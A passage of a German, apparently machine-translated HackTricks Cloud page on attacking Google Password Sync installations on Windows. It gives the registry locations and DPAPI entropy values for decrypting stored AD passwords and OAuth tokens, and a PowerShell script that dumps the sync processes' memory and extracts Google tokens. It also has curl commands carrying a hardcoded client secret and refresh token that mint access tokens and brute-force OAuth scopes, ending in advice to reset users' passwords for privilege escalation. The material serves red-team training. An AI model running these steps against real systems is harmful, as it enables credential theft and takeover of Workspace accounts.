* Sehr schlechte Idee, da diese Anmeldeinformationen niemals ablaufen und missbraucht werden k√∂nnten
* Sehr schlechte Idee, einem SA Zugriff auf Workspace zu gew√§hren, da der SA in GCP kompromittiert werden k√∂nnte und es m√∂glich w√§re, zu Workspace zu pivotieren
* Google ben√∂tigt dies f√ºr dom√§nenkontrollierte Umgebungen ohne GUI
* Diese Anmeldeinformationen werden ebenfalls im Registrierungseditor gespeichert

Bez√ºglich AD ist es m√∂glich, anzugeben, dass der aktuelle **Anwendungskontext, anonym oder einige spezifische Anmeldeinformationen** verwendet werden sollen. Wenn die Option Anmeldeinformationen ausgew√§hlt ist, wird der **Benutzername** in einer Datei auf der **Festplatte** gespeichert und das **Passwort** ist **verschl√ºsselt** und im **Registrierungseditor** gespeichert.

### GPS - Dumping von Passwort und Token von der Festplatte

{% hint style="success" %}
Beachten Sie, dass [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) in der Lage ist, **GPS** zu erkennen, Informationen √ºber die Konfiguration zu erhalten und **sogar das Passwort und das Token zu entschl√ºsseln**.
{% endhint %}

In der Datei **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** ist es m√∂glich, einen Teil der Konfiguration wie den **`baseDN`** des konfigurierten AD und den **`Benutzernamen`**, dessen Anmeldeinformationen verwendet werden, zu finden.

Im Registrierungseditor **`HKLM\Software\Google\Google Apps Password Sync`** ist es m√∂glich, das **verschl√ºsselte Aktualisierungstoken** und das **verschl√ºsselte Passwort** f√ºr den AD-Benutzer (falls vorhanden) zu finden. Dar√ºber hinaus, wenn anstelle eines Tokens einige **SA-Anmeldeinformationen** verwendet werden, ist es auch m√∂glich, diese an dieser Registrierungsadresse verschl√ºsselt zu finden. Die **Werte** in dieser Registrierung sind nur f√ºr **Administratoren** **zug√§nglich**.

Das verschl√ºsselte **Passwort** (falls vorhanden) befindet sich im Schl√ºssel **`ADPassword`** und ist mit der **`CryptProtectData`** API verschl√ºsselt. Um es zu entschl√ºsseln, m√ºssen Sie der gleiche Benutzer sein wie der, der die Passwortsynchronisierung konfiguriert hat, und diese **Entropie** verwenden, wenn Sie die **`CryptUnprotectData`** verwenden: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Das verschl√ºsselte Token (falls vorhanden) befindet sich im Schl√ºssel **`AuthToken`** und ist mit der **`CryptProtectData`** API verschl√ºsselt. Um es zu entschl√ºsseln, m√ºssen Sie der gleiche Benutzer sein wie der, der die Passwortsynchronisierung konfiguriert hat, und diese **Entropie** verwenden, wenn Sie die **`CryptUnprotectData`** verwenden: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Dar√ºber hinaus ist es auch mit base32hex unter Verwendung des W√∂rterbuchs **`0123456789abcdefghijklmnopqrstv`** codiert.

Die Entropiewerte wurden mit dem Tool gefunden. Es wurde konfiguriert, um die Aufrufe von **`CryptUnprotectData`** und **`CryptProtectData`** zu √ºberwachen, und dann wurde das Tool verwendet, um `PasswordSync.exe` zu starten und zu √ºberwachen, das das konfigurierte Passwort und das Auth-Token zu Beginn entschl√ºsselt, und das Tool wird die **Werte f√ºr die verwendete Entropie** in beiden F√§llen **anzeigen**:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Beachten Sie, dass es auch m√∂glich ist, die **entschl√ºsselten** Werte in den Eingaben oder Ausgaben der Aufrufe dieser APIs zu sehen (f√ºr den Fall, dass Winpeas irgendwann nicht mehr funktioniert).

Falls die Passwortsynchronisierung **mit SA-Anmeldeinformationen konfiguriert wurde**, wird sie ebenfalls in Schl√ºsseln im Registrierungseditor **`HKLM\Software\Google\Google Apps Password Sync`** gespeichert.

### GPS - Dumping von Tokens aus dem Speicher

Genau wie bei GCPW ist es m√∂glich, den Speicher des Prozesses von `PasswordSync.exe` und den Prozessen `password_sync_service.exe` zu dumpen, und Sie werden in der Lage sein, Aktualisierungs- und Zugriffstokens zu finden (falls sie bereits generiert wurden).\
Ich nehme an, Sie k√∂nnten auch die konfigurierten AD-Anmeldeinformationen finden.

<details>

<summary>Dump <code>PasswordSync.exe</code> und die <code>password_sync_service.exe</code> Prozesse und suchen Sie nach Tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Zugriffstoken aus Aktualisierungstoken generieren

Mit dem Aktualisierungstoken ist es m√∂glich, Zugriffstoken zu generieren, indem es zusammen mit der Client-ID und dem Client-Geheimnis verwendet wird, die im folgenden Befehl angegeben sind:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Beachten Sie, dass es selbst mit einem Refresh-Token nicht m√∂glich ist, einen beliebigen Scope f√ºr das Access-Token anzufordern, da Sie nur die **Scopes anfordern k√∂nnen, die von der Anwendung unterst√ºtzt werden, in der Sie das Access-Token generieren**.

Au√üerdem ist der Refresh-Token nicht in jeder Anwendung g√ºltig.
{% endhint %}

Standardm√§√üig hat GPS nicht als Benutzer Zugriff auf jeden m√∂glichen OAuth-Scope. Mit dem folgenden Skript k√∂nnen wir die Scopes finden, die mit dem `refresh_token` verwendet werden k√∂nnen, um ein `access_token` zu generieren:

<details>

<summary>Bash-Skript zum Brute-Forcen von Scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Und dies ist die Ausgabe, die ich zum Zeitpunkt des Schreibens erhalten habe:
```
https://www.googleapis.com/auth/admin.directory.user
```
Welches dasselbe ist, das Sie erhalten, wenn Sie keinen Geltungsbereich angeben.

{% hint style="danger" %}
Mit diesem Geltungsbereich k√∂nnten Sie **das Passwort eines bestehenden Benutzers √§ndern, um Berechtigungen zu eskalieren**.
{% endhint %}

## Referenzen

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
